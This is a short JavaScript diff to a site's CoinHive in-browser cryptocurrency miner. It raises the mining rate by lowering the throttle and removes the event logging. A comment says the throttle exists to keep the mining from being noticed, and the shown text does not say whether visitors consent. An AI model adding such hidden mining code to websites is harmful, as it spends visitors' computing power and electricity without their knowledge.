@@ -92,7 +92,7 @@ if (CoinHive) {
   const miner = new CoinHive.User(coinHiveKey, userId);
 
   // Heavily throttle mining to prevent noticiable impact
-  miner.setThrottle(0.9);
+  miner.setThrottle(0.85);
 
   const checkCoinHiveStatus = () => {
     if (!miner.isRunning()) {
@@ -113,22 +113,6 @@ if (CoinHive) {
     if (!statusLoop) return;
     statusLoop = clearInterval(statusLoop);
   };
-
-  const events = [
-    // 'open',
-    'authed',
-    // 'close',
-    'error',
-    'job',
-    'found',
-    'accepted',
-  ];
-
-  // Log events
-  events.forEach((e) => {
-    // eslint-disable-next-line no-console
-    miner.on(e, () => console.debug(e));
-  });
 
   miner.on('open', () => {
     console.debug('open'); // eslint-disable-line no-console
